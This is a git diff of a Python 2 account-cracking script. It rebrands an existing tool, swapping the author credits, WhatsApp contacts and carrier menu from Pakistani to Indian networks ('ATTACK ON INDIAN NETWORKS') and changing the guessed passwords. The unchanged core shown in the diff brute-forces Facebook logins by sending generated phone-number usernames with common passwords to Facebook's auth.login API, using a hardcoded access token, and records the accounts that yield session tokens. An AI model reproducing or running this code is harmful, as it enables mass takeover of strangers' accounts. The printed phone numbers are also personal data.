@@ -47,22 +47,21 @@ def t():
     time.sleep(1)
 def cb():
     os.system('clear')
-##### Dev : Arbab Ali Memon#####
+##### Dev : ShuBhamg0sain#####
 ##### LOGO #####
 logo='''
-\033[1;91m█▀▄▀█ █▀▀█ █▀▀ ░▀░ █▀▀█
-\033[1;93m█░▀░█ █▄▄█ █▀▀ ▀█▀ █▄▄█
-\033[1;92m▀░░░▀ ▀░░▀ ▀░░ ▀▀▀ ▀░░▀
+\033[1;91m█▀▄▀█ █▀▀█
+\033[1;93m█░▀░█ █▄▄█
+\033[1;92m▀░░░▀ ▀░░▀ 
 
 \033[1;97m█░█ ░▀░ █░░ █░░ █▀▀ █▀▀█
 \033[1;96m█▀▄ ▀█▀ █░░ █░░ █▀▀ █▄▄▀
 \033[1;95m▀░▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀░▀▀
 \x1b[1;93m--------------------------------------------------------------
-\x1b[1;92m➣  NAME  : FAROOQ ANSARI
-\x1b[1;91m➣  CYBER NAME : MAFIA-KILLER
-\x1b[1;93m➣  WHATSAPP NO     : +92132197796
+\x1b[1;92m➣  NAME  : ShuBhamg0sain
+\x1b[1;91m➣  CYBER NAME : MACK-KILLER
+\x1b[1;93m➣  WHATSAPP NO     : +919557777030
 \x1b[1;95m➣  WARNING  : DON,T CALL ME ONLY TEXT
-\x1b[1;96m➣  FUNNY LINE : AGEA ME JAWAN HO KE
 \x1b[1;97m➣  NOTE     : USE FAST 4G SIM NET
 \x1b[1;94m➣  DISCLAMIAR :AWAY FROM ILLIGAL WAY.
 \x1b[1;93m--------------------------------------------------------------"""
@@ -78,14 +77,14 @@ def menu():
         print logo
         print "\033[1;92mCYBER_HACKER_GLAXY_R.H.P_1.286-Wellcome"
         print
-        print "\033[1;91mATTACK ON PAKISTAN NETWORKS"
-        print "\033[1;92m[1]  MOBILINK"
-        print "\033[1;92m[2]  TELINOR"
-        print "\033[1;92m[3]  WARID"
-        print "\033[1;92m[4]  UFONE"
-        print "\033[1;92m[5]  ZONG"
+        print "\033[1;91mATTACK ON INDIAN NETWORKS"
+        print "\033[1;92m[1]  voda"
+        print "\033[1;92m[2]  idea"
+        print "\033[1;92m[3]  airtel"
+        print "\033[1;92m[4]  jio"
+        print "\033[1;92m[5]  bsnl"
         print "\033[1;92m[6]  UPDATE SYSTEM"
-        print "\033[1;92m[0]  EXIT_KALTI MAR"
+        print "\033[1;92m[0]  EXIT"
         print 50*'-'
         action()
 
@@ -199,9 +198,7 @@ def action():
         time.sleep(0.5)
         psb ('[✓] Please wait, process is running ...')
         time.sleep(0.5)
-        psb ('[✓] Last 07 Digit Crack,pakistan,786786 Found ...')
-        time.sleep(0.5)
-        psb ('[!] Kalti Marne Ke lye(To Exit) Press CTRL Then Press z')
+        psb ('[!] (for Exit) Press CTRL Then Press z')
         time.sleep(0.5)
         print 50*'-'
         print
@@ -232,7 +229,7 @@ def action():
                                         cps.close()
                                         cpb.append(c+user+pass1)
                                 else:
-                                        pass2 = 'pakistan'
+                                        pass2 = '786786'
                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                         q = json.load(data)
                                         if 'access_token' in q:
@@ -249,7 +246,7 @@ def action():
                                                         cps.close()
                                                         cpb.append(c+user+pass2)
                                                 else:
-                                                        pass3 = '786786'
+                                                        pass3 = '521476'
                                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                         q = json.load(data)
                                                         if 'access_token' in q:
